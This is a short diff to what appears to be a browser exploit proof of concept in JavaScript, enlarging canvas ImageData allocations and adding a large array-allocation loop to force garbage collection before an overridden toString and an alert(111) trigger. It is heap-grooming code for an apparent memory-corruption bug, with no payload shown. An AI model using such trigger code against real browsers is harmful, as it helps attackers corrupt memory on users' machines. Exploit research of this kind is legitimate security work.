@@ -6,7 +6,7 @@ function gc() {
         var gl = c.getContext("2d");
 
         for (var i = 0; i < 0x10000; i++) {
-            var gggg = gl.createImageData(1, 0x10)
+            var gggg = gl.createImageData(1, 0x1000)
         }
     } catch (e) {
 
@@ -25,6 +25,9 @@ var a = [b,{toString:function(){
  //for(var i=0;i<0x10;i++){
  gc();
  //}
+ for(var i=0;i<0x1000000;i++){
+     new Array();
+ }
  sleep(1000)
  alert(111)
 this.toString = function(){return '123'}
